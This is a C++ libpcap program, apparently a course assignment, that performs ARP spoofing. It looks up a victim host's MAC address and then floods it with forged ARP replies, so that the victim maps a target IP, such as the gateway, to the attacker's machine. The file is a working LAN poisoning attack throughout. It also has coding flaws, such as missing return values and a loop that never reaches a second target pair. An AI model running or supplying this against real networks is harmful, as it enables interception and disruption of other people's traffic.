#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int GetInterfaceMacAddress(char * ifname,char * MAC_Address){
	uint8_t *mac = (uint8_t *)malloc(sizeof(uint8_t) * 30);
	struct ifreq ifr;
	int sockfd, ret;
	sockfd = socket(AF_INET,SOCK_DGRAM,0);
	if(sockfd < 0){
		printf("Fail to get interface MAC address - socket() failed\n");
		return -1;
	}
	strncpy(ifr.ifr_name,ifname,IFNAMSIZ);
	ret = ioctl(sockfd , SIOCGIFHWADDR,&ifr);
	if (ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed \n");
		close(sockfd);
		return -1;
	}
	memcpy(mac,ifr.ifr_hwaddr.sa_data,6);
	close(sockfd);	
	sprintf(MAC_Address,"%02X:%02X:%02X:%02X:%02X:%02X",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
	free(mac);
}

int GetInterfaceIP(char *ifname,char * ip){
	struct ifreq ifr;
	int s;
	s = socket(AF_INET,SOCK_DGRAM,0);
	strncpy(ifr.ifr_name,ifname,IFNAMSIZ);

	if(ioctl(s,SIOCGIFADDR,&ifr) < 0){
		printf("ERROR");
		return -1;
	}
	inet_ntop(AF_INET,ifr.ifr_addr.sa_data + 2,ip,sizeof(struct sockaddr));
}

void GetSenderMACaddr(pcap_t* handle,char * sender_ip,char * target_ip,char *my_mac_addr,char * ip,char * sender_mac_addr){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = Mac(my_mac_addr);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac_addr);
	packet.arp_.sip_ = htonl(Ip(ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(sender_ip));
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	while(1){
		struct pcap_pkthdr* header;
        EthArpPacket *packet1;
        int res = pcap_next_ex(handle, &header,(const u_char **) &packet1);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
			if((packet1->eth_.type_!= htons(EthHdr::Arp)))  {
			continue;
		}
		sprintf(sender_mac_addr,"%02X:%02X:%02X:%02X:%02X:%02X",packet1->eth_.smac_[0],packet1->eth_.smac_[1],packet1->eth_.smac_[2],packet1->eth_.smac_[3],packet1->eth_.smac_[4],packet1->eth_.smac_[5]);
		
		break;
	}
	return ;
}
void send_packet(pcap_t* handle,char * sender_ip,char * target_ip,char *my_mac_addr,char * ip){
	char * sender_mac_addr = (char *)malloc(sizeof(char) * 30);

	GetSenderMACaddr(handle,sender_ip,target_ip,my_mac_addr,ip,sender_mac_addr);
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac_addr);
	packet.eth_.smac_ = Mac(my_mac_addr);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(my_mac_addr);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac_addr);
	packet.arp_.tip_ = htonl(Ip(sender_ip));
	while(1){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	printf("sending...\n");
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}}
}
int main(int argc, char* argv[]) {
	if (argc % 2 | argc < 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	char *mac_addr = (char *)malloc(sizeof(uint8_t) * 20);
	char *ip = (char *)malloc(sizeof(uint8_t) * 20);
	GetInterfaceMacAddress(argv[1],mac_addr);
	GetInterfaceIP(argv[1],ip);
	int cnt = (argc - 2) / 2;
	for(int i=1;i<=cnt;i++){
		send_packet(handle,argv[2 * i],argv[2 * i + 1],mac_addr,ip);
	}

	pcap_close(handle);
}
